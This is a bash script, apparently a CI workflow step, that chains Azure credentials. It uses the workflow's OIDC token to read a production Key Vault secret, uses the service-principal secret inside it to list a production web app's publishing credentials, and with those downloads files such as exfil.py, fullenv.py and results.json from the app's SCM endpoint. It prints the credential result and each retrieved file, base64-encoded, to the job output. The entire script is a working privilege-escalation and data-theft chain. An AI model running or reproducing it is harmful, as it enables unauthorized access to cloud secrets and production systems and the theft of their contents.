#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'; say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
BASE=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
RPT=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RPT"|jq -r '.value|fromjson|.appId // empty'); RSC=$(echo "$RPT"|jq -r '.value|fromjson|.clientSecret // empty'); RT=$(echo "$RPT"|jq -r '.value|fromjson|.tenantId // empty')
RA=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/token" -d "client_id=$RID" -d 'grant_type=client_credentials' -d "client_secret=$RSC" -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
B="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RA" -H 'Content-Length: 0' "$B/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC"|jq -r '.properties.publishingUserName // empty'); PP=$(echo "$PC"|jq -r '.properties.publishingPassword // empty')
say "PUB=$([[ -n "$PU" && -n "$PP" ]] && echo OK || echo FAIL)"; [[ -n "$PU" && -n "$PP" ]] || exit 0
SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
for p in 'site/wwwroot/check_kv.py' 'site/wwwroot/exfil.py' 'site/wwwroot/fullenv.py' 'site/wwwroot/msi_probe.py' 'site/wwwroot/msi_probe.txt' 'site/wwwroot/results.json' 'results.json' 'site/wwwroot/app.py'; do
  code=$(curl -sS --max-time 20 -o /tmp/f -w '%{http_code}' -u "$PU:$PP" "$SCM/api/vfs/$p" || echo 000)
  say "F_${p//\//_}_HTTP=$code"
  [[ "$code" == "200" ]] && say "F_${p//\//_}_B64=$(base64 -w0 </tmp/f)"
done
say DONE
